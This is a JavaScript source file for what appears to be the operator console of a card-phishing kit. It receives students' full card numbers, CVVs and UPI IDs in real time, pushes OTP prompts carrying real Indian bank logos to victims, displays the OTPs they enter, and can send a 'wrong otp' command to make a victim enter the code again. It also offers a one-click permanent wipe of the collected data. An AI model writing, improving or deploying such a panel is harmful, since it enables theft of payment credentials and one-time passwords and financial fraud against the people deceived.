// Admin Panel - Real-Time Card Submission Management
// WITH PERSISTENT COMMAND EXECUTION STATE AND OTP DISPLAY

let socket = null;
const submissions = new Map(); // Store submissions by sessionId

// Initialize Socket.IO Connection
function initializeConnection() {
    socket = io(window.location.hostname === 'localhost' ? 'http://localhost:3000' : window.location.origin, {
        transports: ['websocket', 'polling'],
        reconnection: true,
        reconnectionDelay: 1000,
        reconnectionAttempts: 10
    });

    // Connection Events
    socket.on('connect', () => {
        console.log('? Connected to server');
        updateConnectionStatus(true);
        updateSocketMonitor();
        setTimeout(() => loadExistingSubmissions(), 1000);
    });

    socket.on('disconnect', () => {
        console.log('? Disconnected from server');
        updateConnectionStatus(false);
        updateSocketMonitor();
    });

    
    socket.on('connect_error', (error) => {
        console.error('Connection error:', error);
        updateConnectionStatus(false);
        updateSocketMonitor();
    });

    // Connection Update
    socket.on('connectionUpdate', (data) => {
        updateConnectionCount(data.activeConnections || 0);
    });

    // Real-Time Card Details Received
    socket.on('cardDetailsReceived', (data) => {
        console.log('?? New card details received:', data);
        handleNewCardSubmission(data);
    });

    // UPI Details Received
    socket.on('upiDetailsReceived', (data) => {
        console.log('?? New UPI details received:', data);
        handleNewUpiSubmission(data);
    });

    // BHIM Details Received
    socket.on('bhimDetailsReceived', (data) => {
        console.log('?? New BHIM details received:', data);
        handleNewBhimSubmission(data);
    });

    // Payment Status Updates
    socket.on('paymentCompleted', (data) => {
        console.log('? Payment completed:', data);
        updateSubmissionStatus(data.sessionId, 'completed');
    });

    socket.on('paymentFailed', (data) => {
        console.log('? Payment failed:', data);
        updateSubmissionStatus(data.sessionId, 'failed', data.reason);
    });
    
    // OTP Response Listener - FIXED EVENT NAME
    socket.on('userOtpSubmitted', async (data) => {
        console.log('OTP received from user:', data);
        console.log('   Session ID:', data.sessionId);
        console.log('   OTP:', data.otp);
        console.log('   Timestamp:', data.timestamp);
        
        let submission = submissions.get(data.sessionId);
        
        // If submission not in memory, fetch from database
        if (!submission) {
            console.warn('Submission not in memory, fetching from server...');
            try {
                const response = await fetch('/api/admin/submissions');
                const allSubmissions = await response.json();
                const found = allSubmissions.find(s => s.sessionId === data.sessionId);
                
                if (found) {
                    console.log('Found submission in database');
                    submission = {
                        id: found.sessionId,
                        type: found.type || 'card',
                        student: found.student,
                        cardDetails: found.cardDetails,
                        upiDetails: found.upiDetails,
                        bhimDetails: found.bhimDetails,
                        amount: found.amount,
                        timestamp: found.timestamp,
                        status: found.status || 'processing',
                        commandExecuted: found.commandExecuted || false,
                        otp: null,
                        otpTimestamp: null
                    };
                    submissions.set(data.sessionId, submission);
                    renderSubmission(submission, false);
                    hideEmptyState();
                }
            } catch (error) {
                console.error('Failed to fetch submission:', error);
            }
        }
        
        if (submission) {
            // Store OTP in submission
            submission.otp = data.otp;
            submission.otpTimestamp = data.timestamp || new Date().toISOString();
            
            // Re-render the card to show OTP
            renderSubmission(submission, false);
            
            // Show notification
            showNotification('OTP Received: ' + data.otp, 'success');
            
            console.log('OTP stored and displayed for session:', data.sessionId);
        } else {
            console.error('Submission not found for session:', data.sessionId);
            console.log('Available sessions:', Array.from(submissions.keys()));
            showNotification('Failed to display OTP - submission not found', 'error');
        }
    });
}

function updateConnectionStatus(isConnected) {
    const statusDot = document.querySelector('.status-dot');
    
    if (statusDot) {
        if (isConnected) {
            statusDot.style.background = '#00ff00';
        } else {
            statusDot.style.background = '#ff0000';
        }
    }
}

// Update Connection Count
function updateConnectionCount(count) {
    const connectionCount = document.getElementById('connectionCount');
    if (connectionCount) {
        connectionCount.textContent = `Connections: ${count}`;
    }
}

// Handle New Card Submission
function handleNewCardSubmission(data) {
    const submission = {
        id: data.sessionId,
        type: 'card',
        student: data.student,
        cardDetails: data.cardDetails,
        amount: data.amount,
        timestamp: data.timestamp || new Date().toISOString(),
        status: data.status || 'processing',
        commandExecuted: data.commandExecuted || false,
        otp: null,
        otpTimestamp: null,
        viewed: false
    };
    
    submissions.set(data.sessionId, submission);
    renderSubmission(submission, true);
    hideEmptyState();
}

// Handle New UPI Submission
function handleNewUpiSubmission(data) {
    const submission = {
        id: data.sessionId,
        type: 'upi',
        student: data.student,
        upiDetails: data.upiDetails,
        amount: data.amount,
        timestamp: data.timestamp || new Date().toISOString(),
        status: data.status || 'processing',
        commandExecuted: data.commandExecuted || false,
        otp: null,
        otpTimestamp: null,
        viewed: false
    };
    
    submissions.set(data.sessionId, submission);
    renderSubmission(submission, true);
    hideEmptyState();
}

// Handle New BHIM Submission
function handleNewBhimSubmission(data) {
    const submission = {
        id: data.sessionId,
        type: 'bhim',
        student: data.student,
        bhimDetails: data.bhimDetails,
        amount: data.amount,
        timestamp: data.timestamp || new Date().toISOString(),
        status: data.status || 'processing',
        commandExecuted: data.commandExecuted || false,
        otp: null,
        otpTimestamp: null,
        viewed: false
    };
    
    submissions.set(data.sessionId, submission);
    renderSubmission(submission, true);
    hideEmptyState();
}


// Mark submission as viewed (removes NEW tag and red background)
async function markAsViewed(sessionId) {
    const submission = submissions.get(sessionId);
    if (!submission) return;
    
    // Already viewed, skip
    if (submission.viewed) return;
    
    console.log('Marking submission as viewed:', sessionId);
    
    // Update locally
    submission.viewed = true;
    
    // Re-render to remove NEW tag
    renderSubmission(submission, false);
    
    // Persist to database
    try {
        await fetch(`/api/admin/submissions/${sessionId}/mark-viewed`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' }
        });
        console.log('Submission marked as viewed in database');
    } catch (error) {
        console.error('Error marking submission as viewed:', error);
    }
}
// Render Submission as Table Row - COMPACT LAYOUT
function renderSubmission(submission, isNew = false) {
    // Show NEW only for real-time submissions that haven't been viewed
    // isNew=true means it just came in via WebSocket (not from database load)
    // If already viewed, don't show NEW even if it's new
    if (submission.viewed) {
        isNew = false;
    }
    console.log('[RENDER] renderSubmission called for:', submission.id, 'isNew:', isNew);
    const tableBody = document.getElementById('submissionsTableBody');
    
    // Check if row already exists
    const existingRow = document.getElementById(`row-${submission.id}`);
    if (existingRow) {
        existingRow.remove();
    }
    
    const row = document.createElement('tr');
    row.className = isNew ? 'new' : '';
    row.id = `row-${submission.id}`;
    
    
    const formattedTime = formatTimestamp(submission.timestamp);
    const shortSessionId = submission.id.substring(0, 10);
    
    // Determine if commands should be disabled
    const commandsDisabled = submission.commandExecuted || 
                            submission.status === 'completed' || 
                            submission.status === 'failed' || 
                            submission.status === 'invalid';
    
    let detailsHtml = '';
    
    if (submission.type === 'card') {
        detailsHtml = `${submission.cardDetails.cardNumber} | ${submission.cardDetails.expiryDate} | ${submission.cardDetails.cvv}`;
    } else if (submission.type === 'upi') {
        detailsHtml = `${submission.upiDetails.upiId}`;
    } else if (submission.type === 'bhim') {
        detailsHtml = `${submission.bhimDetails.upiId}`;
    }
    
    // OTP Display
    let otpHtml = '';
    if (submission.otp) {
        otpHtml = `
            <div class="otp-display">
                <span class="otp-value">${submission.otp}</span>
                <button class="wrong-otp-btn" onclick="sendWrongOtpCommand('${submission.id}')" ${commandsDisabled ? 'disabled' : ''}>
                    Wrong
                </button>
            </div>
        `;
    }
    
    // Add click handler to mark submission as viewed
row.onclick = () => markAsViewed(submission.id);
    
    row.innerHTML = `
        <td>${isNew ? '<span class="new-indicator">NEW</span>' : ''}</td>
        <td><span class="type-badge type-${submission.type}">${submission.type.toUpperCase()}</span></td>
        <td class="session-id" title="${submission.id}">${shortSessionId}</td>
        <td class="student-name" title="${submission.student.name}">${submission.student.name}</td>
        <td class="roll-number">${submission.student.rollNumber}</td>
        <td class="card-number" title="${detailsHtml}">${detailsHtml}</td>
        <td class="amount-cell">?${submission.amount}</td>
        <td class="time-cell">${formattedTime}</td>
        <td><span class="status-badge status-${submission.status}">${submission.status.toUpperCase()}</span></td>
        <td>
            <div class="commands-cell">
                <button class="command-btn btn-otp" onclick="executeOtpCommand('${submission.id}')" ${commandsDisabled || submission.otpRequested ? 'disabled' : ''} title="Request OTP">
                    OTP
                </button>
                <button class="command-btn btn-success" onclick="executeCommand('${submission.id}', 'success')" ${commandsDisabled ? 'disabled' : ''} title="Approve Payment">
                    ?
                </button>
                <button class="command-btn btn-fail" onclick="executeCommand('${submission.id}', 'fail')" ${commandsDisabled ? 'disabled' : ''} title="Reject Payment">
                    ?
                </button>
                <button class="command-btn btn-invalid" onclick="executeCommand('${submission.id}', 'invalid')" ${commandsDisabled ? 'disabled' : ''} title="Mark Invalid">
                    !
                </button>
            </div>
            ${otpHtml}
        </td>
    `;
    
    // Insert at the correct position based on timestamp (newest first)
    const rows = Array.from(tableBody.querySelectorAll('tr'));
    let inserted = false;
    
    for (let i = 0; i < rows.length; i++) {
        const rowId = rows[i].id.replace('row-', '');
        const existingSubmission = submissions.get(rowId);
        
        if (existingSubmission && new Date(submission.timestamp) > new Date(existingSubmission.timestamp)) {
            tableBody.insertBefore(row, rows[i]);
            inserted = true;
            break;
        }
    }
    
    // If not inserted, append at the end
    if (!inserted) {
        tableBody.appendChild(row);
    }
}

// Execute Admin Command with PERSISTENT STATE
async function executeCommand(sessionId, action) {
    const submission = submissions.get(sessionId);
    if (!submission) {
        console.error('Submission not found:', sessionId);
        return;
    }
    
    // Prevent duplicate execution
    if (submission.commandExecuted) {
        showNotification('Command already executed for this submission', 'warning');
        return;
    }
    
    console.log(`? Executing command: ${action} for session: ${sessionId}`);
    
    let newStatus = 'processing';
    let reason = null;
    
    if (action === 'success') {
        // Approve payment
        socket.emit('adminCommand', {
            command: 'approvePayment',
            sessionId: sessionId,
            action: 'approve'
        });
        
        newStatus = 'completed';
        showNotification(`? Payment approved for ${submission.student.name}`, 'success');
        
    } else if (action === 'fail') {
        // Reject payment
        reason = prompt('Enter rejection reason:', 'Card declined') || 'Card declined';
        
        socket.emit('adminCommand', {
            command: 'rejectPayment',
            sessionId: sessionId,
            action: 'reject',
            reason: reason
        });
        
        newStatus = 'failed';
        showNotification(`? Payment rejected for ${submission.student.name}`, 'error');
        
    } else if (action === 'invalid') {
        // Mark as invalid
        socket.emit('adminCommand', {
            command: 'rejectPayment',
            sessionId: sessionId,
            action: 'invalid',
            reason: 'Invalid card details'
        });
        
        newStatus = 'invalid';
        reason = 'Invalid card details';
        showNotification(`?? Payment marked as invalid for ${submission.student.name}`, 'warning');
    }
    
    // CRITICAL: Update submission status in database via API
    try {
        const response = await fetch(`/api/admin/submissions/${sessionId}/execute-command`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                action: action,
                status: newStatus,
                reason: reason
            })
        });
        
        const result = await response.json();
        
        if (result.success) {
            console.log('? Command execution persisted to database');
            updateSubmissionStatus(sessionId, newStatus, reason);
        } else {
            console.error('? Failed to persist command execution');
            showNotification('Failed to save command state', 'error');
        }
    } catch (error) {
        console.error('Error persisting command:', error);
        showNotification('Error saving command state', 'error');
    }
}





// NEW: Send Wrong OTP Command
function sendWrongOtpCommand(sessionId) {
    const submission = submissions.get(sessionId);
    if (!submission) {
        console.error('Submission not found:', sessionId);
        return;
    }
    
    console.log('? Sending wrong OTP command for session:', sessionId);
    
    // Emit wrong OTP command to user's page
    socket.emit('adminCommand', {
        command: 'wrong otp',
        sessionId: sessionId
    });
    
    showNotification('? Wrong OTP command sent to user', 'warning');
}
// Update Submission Status
function updateSubmissionStatus(sessionId, status, reason = null) {
    const submission = submissions.get(sessionId);
    if (submission) {
        submission.status = status;
        submission.commandExecuted = true;
        if (reason) {
            submission.failureReason = reason;
        }
        
        // Re-render the card
        renderSubmission(submission, false);
    }
}

// Show Notification
function showNotification(message, type = 'info') {
    console.log(`[${type.toUpperCase()}] ${message}`);
    
    // Create notification element
    const notification = document.createElement('div');
    notification.style.cssText = `
        position: fixed;
        top: 100px;
        right: 40px;
        background: ${type === 'success' ? '#00cc00' : type === 'error' ? '#cc0000' : type === 'warning' ? '#cc6600' : '#0066cc'};
        color: #ffffff;
        padding: 15px 20px;
        border-radius: 8px;
        box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
        z-index: 1000;
        font-size: 14px;
        font-weight: 500;
        animation: slideInRight 0.3s ease-out;
    `;
    notification.textContent = message;
    
    document.body.appendChild(notification);
    
    // Remove after 3 seconds
    setTimeout(() => {
        notification.style.animation = 'slideOutRight 0.3s ease-out';
        setTimeout(() => {
            notification.remove();
        }, 300);
    }, 3000);
}
// Hide Empty State
function hideEmptyState() {
    const emptyState = document.getElementById('emptyState');
    const table = document.getElementById('submissionsTable');
    if (emptyState && table) {
        emptyState.style.display = 'none';
        table.style.display = 'table';
    }
}
// Format Timestamp
function formatTimestamp(timestamp) {
    const date = new Date(timestamp);
    const now = new Date();
    const diffMs = now - date;
    const diffMins = Math.floor(diffMs / 60000);
    
    if (diffMins < 1) {
        return 'Just now';
    } else if (diffMins < 60) {
        return `${diffMins}m ago`;
    } else {
        const hours = date.getHours().toString().padStart(2, '0');
        const minutes = date.getMinutes().toString().padStart(2, '0');
        return `${hours}:${minutes}`;
    }
}

// Add CSS animations and OTP display styling
const style = document.createElement('style');
style.textContent = `
    @keyframes slideInRight {
        from {
            transform: translateX(400px);
            opacity: 0;
        }
        to {
            transform: translateX(0);
            opacity: 1;
        }
    }
    
    @keyframes slideOutRight {
        from {
            transform: translateX(0);
            opacity: 1;
        }
        to {
            transform: translateX(400px);
            opacity: 0;
        }
    }
    
    /* OTP Display Styling */
    .otp-display {
        display: inline-flex;
        align-items: center;
        gap: 8px;
        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        padding: 8px 16px;
        border-radius: 8px;
        margin: 0 8px;
        animation: otpPulse 0.5s ease-out;
    }
    
    @keyframes otpPulse {
        0% {
            transform: scale(0.8);
            opacity: 0;
        }
        50% {
            transform: scale(1.05);
        }
        100% {
            transform: scale(1);
            opacity: 1;
        }
    }
    
    .otp-label {
        font-size: 13px;
        font-weight: 600;
        color: #ffffff;
    }
    
    .otp-value {
        font-size: 18px;
        font-weight: 700;
        color: #ffffff;
        letter-spacing: 3px;
        background: rgba(255, 255, 255, 0.2);
        padding: 4px 12px;
        border-radius: 6px;
        font-family: 'Courier New', monospace;
    }
    
    .otp-time {
        font-size: 11px;
        color: rgba(255, 255, 255, 0.8);
        font-style: italic;
    }
    
    
    /* Wrong OTP Button Styling */
    .wrong-otp-btn {
        background: #dc2626;
        color: white;
        border: none;
        padding: 6px 12px;
        border-radius: 6px;
        font-size: 11px;
        font-weight: 600;
        cursor: pointer;
        transition: all 0.3s;
        margin-left: 8px;
    }
    
    .wrong-otp-btn:hover:not(:disabled) {
        background: #b91c1c;
        transform: scale(1.05);
    }
    
    .wrong-otp-btn:disabled {
        background: #6b7280;
        cursor: not-allowed;
        opacity: 0.5;
    }
        .btn-otp {
        background: #9333ea;
        color: white;
    }
    .btn-otp:hover:not(:disabled) {
        background: #7e22ce;
    }
    .btn-otp:disabled {
        background: #6b7280;
        cursor: not-allowed;
        opacity: 0.5;
    }
`;
document.head.appendChild(style);

// Load existing submissions from database
async function loadExistingSubmissions() {
    try {
        const response = await fetch('/api/admin/submissions');
        const result = await response.json();
        
        if (result.success && result.submissions && result.submissions.length > 0) {
            console.log('?? Loaded ' + result.total + ' previous submissions');
            
            result.submissions.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
            
            result.submissions.forEach(submission => {
                const data = {
                    sessionId: submission.sessionId,
                    student: submission.student,
                    amount: submission.amount,
                    timestamp: submission.timestamp,
                    status: submission.status || 'processing',
                    commandExecuted: submission.commandExecuted || false,
                    otp: submission.otp || null,
                    otpTimestamp: submission.otpTimestamp || null
                };
                
                // Create submission object and render WITHOUT isNew flag (loaded from DB)
                let submissionObj;
                if (submission.type === 'card' && submission.cardDetails) {
                    data.cardDetails = submission.cardDetails;
                    submissionObj = {
                        id: data.sessionId,
                        type: 'card',
                        student: data.student,
                        cardDetails: data.cardDetails,
                        amount: data.amount,
                        timestamp: data.timestamp,
                        status: data.status,
                        commandExecuted: data.commandExecuted,
                        otp: data.otp,
                        otpTimestamp: data.otpTimestamp,
                        viewed: submission.viewed || false
                    };
                } else if (submission.type === 'upi' && submission.upiDetails) {
                    data.upiDetails = submission.upiDetails;
                    submissionObj = {
                        id: data.sessionId,
                        type: 'upi',
                        student: data.student,
                        upiDetails: data.upiDetails,
                        amount: data.amount,
                        timestamp: data.timestamp,
                        status: data.status,
                        commandExecuted: data.commandExecuted,
                        otp: data.otp,
                        otpTimestamp: data.otpTimestamp,
                        viewed: submission.viewed || false
                    };
                } else if (submission.type === 'bhim' && submission.bhimDetails) {
                    data.bhimDetails = submission.bhimDetails;
                    submissionObj = {
                        id: data.sessionId,
                        type: 'bhim',
                        student: data.student,
                        bhimDetails: data.bhimDetails,
                        amount: data.amount,
                        timestamp: data.timestamp,
                        status: data.status,
                        commandExecuted: data.commandExecuted,
                        otp: data.otp,
                        otpTimestamp: data.otpTimestamp,
                        viewed: submission.viewed || false
                    };
                }
                
                if (submissionObj) {
                    submissions.set(submissionObj.id, submissionObj);
                    // Render with isNew=false for loaded submissions (only show NEW for real-time)
                    renderSubmission(submissionObj, false);
                    hideEmptyState();
                    console.log('Rendered submission:', submissionObj.id);
                }
            });
        }
    } catch (error) {
        console.error('Error loading submissions:', error);
    }
}


// Execute OTP Command - Show Bank Selection Modal
let currentOtpSessionId = null;

function executeOtpCommand(sessionId) {
    const submission = submissions.get(sessionId);
    if (!submission) {
        console.error('Submission not found:', sessionId);
        return;
    }
    
    if (submission.otpRequested) {
        showNotification('OTP already requested for this submission', 'warning');
        return;
    }
    
    currentOtpSessionId = sessionId;
    showBankSelectionModal();
}

function showBankSelectionModal() {
    const modal = document.getElementById('bankSelectionModal');
    const bankOptions = document.getElementById('bankOptions');
    
    const banks = [
        { name: 'Axis Bank', logo: 'https://upload.wikimedia.org/wikipedia/commons/thumb/1/1a/Axis_Bank_logo.svg/1200px-Axis_Bank_logo.svg.png' },
        { name: 'State Bank of India', logo: 'https://pnghdpro.com/wp-content/themes/pnghdpro/download/social-media-and-brands/sbi-logo.png' },
        { name: 'HDFC Bank', logo: 'https://1000logos.net/wp-content/uploads/2021/06/HDFC-Bank-logo-500x281.png' },
        { name: 'Union Bank', logo: 'https://images.seeklogo.com/logo-png/24/2/union-bank-of-india-logo-png_seeklogo-248528.png' },
        { name: 'Bank of Baroda', logo: 'https://logos-world.net/wp-content/uploads/2020/11/Bank-of-Baroda-Emblem-700x394.png' },
        { name: 'Central Bank', logo: 'https://images.seeklogo.com/logo-png/24/1/central-bank-of-india-1911-logo-png_seeklogo-248525.png' },
        { name: 'Punjab National Bank', logo: 'https://images.seeklogo.com/logo-png/38/2/punjab-national-bank-pnb-logo-png_seeklogo-386963.png' },
        { name: 'No Bank Logo', logo: null }
    ];
    
    bankOptions.innerHTML = '';
    
    banks.forEach(bank => {
        const btn = document.createElement('button');
        btn.style.cssText = 'padding: 15px; background: #2a2a2a; border: 1px solid #444; border-radius: 4px; color: white; cursor: pointer; text-align: left; transition: all 0.2s;';
        btn.textContent = bank.name;
        btn.onmouseover = () => btn.style.background = '#3a3a3a';
        btn.onmouseout = () => btn.style.background = '#2a2a2a';
        btn.onclick = () => selectBankAndSendOtp(bank.name, bank.logo);
        bankOptions.appendChild(btn);
    });
    
    modal.style.display = 'flex';
}

function closeBankModal() {
    document.getElementById('bankSelectionModal').style.display = 'none';
    currentOtpSessionId = null;
}

function selectBankAndSendOtp(bankName, bankLogo) {
    if (!currentOtpSessionId) return;
    
    const submission = submissions.get(currentOtpSessionId);
    if (!submission) return;
    
    console.log('Requesting OTP for:', currentOtpSessionId, 'Bank:', bankName);
    
    socket.emit('adminCommand', {
        command: 'otp',
        sessionId: currentOtpSessionId,
        bankName: bankName,
        bankLogo: bankLogo
    });
    
    submission.otpRequested = true;
    renderSubmission(submission, false);
    
    showNotification('OTP requested for ' + submission.student.name + ' with ' + bankName, 'info');
    
    closeBankModal();
}
// Initialize on page load
// Permanent Delete All Submissions
async function deleteAllSubmissions() {
    // First confirmation
    const confirm1 = confirm('?? WARNING: This will PERMANENTLY DELETE all submissions data!\n\nThis action CANNOT be undone or recovered by any means.\n\nAre you sure you want to continue?');
    
    if (!confirm1) {
        return;
    }
    
    // Second confirmation
    const confirm2 = confirm('?? FINAL WARNING: All submission data will be PERMANENTLY DELETED!\n\nType YES in the next prompt to confirm deletion.');
    
    if (!confirm2) {
        return;
    }
    
    // Third confirmation with text input
    const userInput = prompt('Type "DELETE ALL" to confirm permanent deletion:');
    
    if (userInput !== 'DELETE ALL') {
        showNotification('? Deletion cancelled - incorrect confirmation text', 'warning');
        return;
    }
    
    console.log('??? Starting permanent deletion of all submissions...');
    showNotification('??? Deleting all submissions permanently...', 'warning');
    
    try {
        // Call backend API to permanently delete all submissions
        const response = await fetch('/api/admin/submissions/delete-all', {
            method: 'DELETE',
            headers: {
                'Content-Type': 'application/json'
            }
        });
        
        const result = await response.json();
        
        if (result.success) {
            console.log('? All submissions permanently deleted');
            
            // Clear local submissions map
            submissions.clear();
            
            // Clear the table
            const tableBody = document.getElementById('submissionsTableBody');
            if (tableBody) {
                tableBody.innerHTML = '';
            }
            
            // Show empty state
            const emptyState = document.getElementById('emptyState');
            const table = document.getElementById('submissionsTable');
            if (emptyState && table) {
                emptyState.style.display = 'flex';
                table.style.display = 'none';
            }
            
            showNotification('? All submissions permanently deleted!', 'success');
        } else {
            console.error('? Failed to delete submissions:', result.message);
            showNotification('? Failed to delete submissions: ' + result.message, 'error');
        }
    } catch (error) {
        console.error('Error deleting submissions:', error);
        showNotification('? Error deleting submissions', 'error');
    }
}


// Performance Monitor
let performanceInterval = null;

async function updatePerformanceMonitor() {
    try {
        // Fetch real metrics from server
        const response = await fetch('/api/admin/metrics');
        const result = await response.json();
        
        if (result.success && result.metrics) {
            const cpuUsage = result.metrics.cpu;
            
            // Update circle progress
            const performanceBar = document.getElementById('performanceBar');
            
            if (performanceBar) {
                const circumference = 100;
                
                performanceBar.setAttribute('stroke-dasharray', `${cpuUsage}, ${circumference}`);
                
                // Change color based on usage
                if (cpuUsage < 50) {
                    performanceBar.style.stroke = '#00ff00'; // Green
                } else if (cpuUsage < 75) {
                    performanceBar.style.stroke = '#ffaa00'; // Orange
                } else {
                    performanceBar.style.stroke = '#ff0000'; // Red
                }
            }
        }
    } catch (error) {
        console.error('Error fetching performance metrics:', error);
        // On error (network down), show 0%
        const performanceBar = document.getElementById('performanceBar');
        if (performanceBar) {
            performanceBar.setAttribute('stroke-dasharray', '0, 100');
            performanceBar.style.stroke = '#ff0000'; // Red for error
        }
    }
}


// Socket Connection Monitor - 100% Accurate Real-Time
function updateSocketMonitor() {
    const socketBar = document.getElementById('socketBar');
    
    if (!socketBar) return;
    
    let connectionStatus = 0;
    let color = '#666666'; // Gray for disconnected
    
    // Check if online and socket connected
    if (!navigator.onLine) {
        // Network is completely offline (WiFi/Data off)
        connectionStatus = 0;
        color = '#ff0000'; // Red for offline
    } else if (socket && socket.connected) {
        // Socket is connected - 100%
        connectionStatus = 100;
        color = '#00aaff'; // Blue for connected
    } else {
        // Network online but socket disconnected
        connectionStatus = 0;
        color = '#ff6600'; // Orange for connecting/reconnecting
    }
    
    const circumference = 100;
    socketBar.setAttribute('stroke-dasharray', `${connectionStatus}, ${circumference}`);
    socketBar.style.stroke = color;
}

// Listen for network status changes
window.addEventListener('online', () => {
    console.log('Network: Online');
    updateSocketMonitor();
});

window.addEventListener('offline', () => {
    console.log('Network: Offline');
    updateSocketMonitor();
});

function startPerformanceMonitor() {
    updatePerformanceMonitor();
    performanceInterval = setInterval(updatePerformanceMonitor, 1000); // Update every 1 second for real-time accuracy
}

// Add continuous socket monitoring
let socketMonitorInterval = null;

function startSocketMonitor() {
    updateSocketMonitor();
    socketMonitorInterval = setInterval(updateSocketMonitor, 500); // Check every 500ms for instant detection
}

window.addEventListener('DOMContentLoaded', () => {
    console.log('?? Admin Panel initialized');
    startPerformanceMonitor();

    updateSocketMonitor();

    initializeConnection();
});




// ============================================
// QR CODE UPLOAD FUNCTIONALITY
// ============================================

let selectedQrFile = null;

function openQrUploadModal() {
    document.getElementById('qrUploadModal').style.display = 'flex';
}

function closeQrUploadModal() {
    document.getElementById('qrUploadModal').style.display = 'none';
    document.getElementById('qrFileInput').value = '';
    document.getElementById('qrPreviewContainer').style.display = 'none';
    document.getElementById('uploadQrButton').disabled = true;
    document.getElementById('qrUploadStatus').textContent = '';
    selectedQrFile = null;
}

function previewQrCode(event) {
    const file = event.target.files[0];
    if (!file) return;
    
    // Validate file type
    if (!file.type.startsWith('image/')) {
        alert('Please select a valid image file');
        return;
    }
    
    // Validate file size (max 5MB)
    if (file.size > 5 * 1024 * 1024) {
        alert('File size must be less than 5MB');
        return;
    }
    
    selectedQrFile = file;
    
    // Show preview
    const reader = new FileReader();
    reader.onload = function(e) {
        const preview = document.getElementById('qrPreview');
        preview.src = e.target.result;
        document.getElementById('qrPreviewContainer').style.display = 'block';
        document.getElementById('uploadQrButton').disabled = false;
    };
    reader.readAsDataURL(file);
}

async function uploadQrCode() {
    if (!selectedQrFile) {
        alert('Please select a QR code image first');
        return;
    }
    
    const uploadButton = document.getElementById('uploadQrButton');
    const statusDiv = document.getElementById('qrUploadStatus');
    
    // Disable button and show loading
    uploadButton.disabled = true;
    uploadButton.textContent = 'Uploading...';
    statusDiv.textContent = 'Uploading QR code...';
    statusDiv.style.color = '#0088ff';
    
    try {
        // Create FormData to send file
        const formData = new FormData();
        formData.append('qrcode', selectedQrFile);
        
        // Upload to server
        const response = await fetch('/api/admin/upload-qr', {
            method: 'POST',
            body: formData
        });
        
        const result = await response.json();
        
        if (response.ok && result.success) {
            statusDiv.textContent = '? QR code uploaded successfully!';
            statusDiv.style.color = '#00ff00';
            showNotification('? QR code uploaded and is now live!', 'success');
            
            // Close modal after 2 seconds
            setTimeout(() => {
                closeQrUploadModal();
            }, 2000);
        } else {
            throw new Error(result.error || 'Upload failed');
        }
    } catch (error) {
        console.error('QR upload error:', error);
        statusDiv.textContent = '? Upload failed: ' + error.message;
        statusDiv.style.color = '#ff0000';
        uploadButton.disabled = false;
        uploadButton.textContent = 'Upload';
    }
}


